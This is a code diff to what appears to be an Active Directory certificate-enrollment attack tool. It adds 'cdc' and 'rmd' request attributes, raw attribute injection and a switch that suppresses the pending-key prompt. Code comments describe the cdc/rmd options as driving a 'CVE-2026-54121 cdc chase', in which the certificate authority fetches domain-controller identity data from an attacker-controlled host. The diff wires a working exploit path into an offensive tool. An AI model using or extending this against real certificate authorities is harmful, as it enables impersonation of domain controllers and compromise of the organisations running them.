@@ -907,7 +907,8 @@ class DCOMRequestInterface:
             return result
 
         # Ask if the user wants to save the private key for pending requests
-        handle_pending_key_save(result, self.parent.key, self.parent.out)
+        if self.parent.prompt_for_pending_key:
+            handle_pending_key_save(result, self.parent.key, self.parent.out)
 
         return None
 
@@ -1063,7 +1064,8 @@ class RPCRequestInterface:
             return result
 
         # Ask if the user wants to save the private key for pending requests
-        handle_pending_key_save(result, self.parent.key, self.parent.out)
+        if self.parent.prompt_for_pending_key:
+            handle_pending_key_save(result, self.parent.key, self.parent.out)
 
         return None
 
@@ -1283,6 +1285,11 @@ class Request:
         http_port: Optional[int] = None,
         no_channel_binding: bool = False,
         dynamic_endpoint: bool = False,
+        cdc: Optional[str] = None,
+        rmd: Optional[str] = None,
+        request_attribute: Optional[List[str]] = None,
+        additional_attributes: Optional[List[str]] = None,
+        prompt_for_pending_key: bool = True,
         **kwargs,  # type: ignore
     ):
         """
@@ -1313,6 +1320,11 @@ class Request:
             port: Port for Web Enrollment
             scheme: Scheme for Web Enrollment (http/https)
             dynamic_endpoint: Use dynamic RPC endpoint
+            cdc: Client-DC (cdc) enrollment attribute host for the CVE-2026-54121 chase
+            rmd: Remote-domain (rmd) DC principal for the CVE-2026-54121 chase
+            request_attribute: Additional raw "key:value" request attributes
+            additional_attributes: Additional raw request attributes (legacy alias)
+            prompt_for_pending_key: Ask before saving a pending request's key
         """
         # Core parameters
         self.target = target
@@ -1340,12 +1352,26 @@ class Request:
         ]
         self.smime = smime
 
+        # Extra enrollment request attributes. cdc/rmd drive the CVE-2026-54121
+        # "cdc chase": the CA is told to fetch DC identity data from an
+        # attacker-controlled host (cdc) for the named DC principal (rmd).
+        request_attributes: List[str] = []
+        if cdc:
+            request_attributes.append(f"cdc:{cdc}")
+        if rmd:
+            request_attributes.append(f"rmd:{rmd}")
+        if request_attribute:
+            request_attributes.extend(request_attribute)
+        self.request_attributes = request_attributes
+
         # Connection parameters
         self.web = web
         self.dcom = dcom
         self.http_port = http_port
         self.http_scheme = http_scheme
         self.no_channel_binding = no_channel_binding
+        self.additional_attributes = additional_attributes or []
+        self.prompt_for_pending_key = prompt_for_pending_key
 
         # Handle default ports based on scheme
         if not self.http_port and self.http_scheme:
@@ -1525,6 +1551,7 @@ class Request:
             self.alt_upn,
             self.alt_sid,
             self.application_policies,
+            request_attributes=self.request_attributes + self.additional_attributes,
         )
 
         # Submit the certificate request
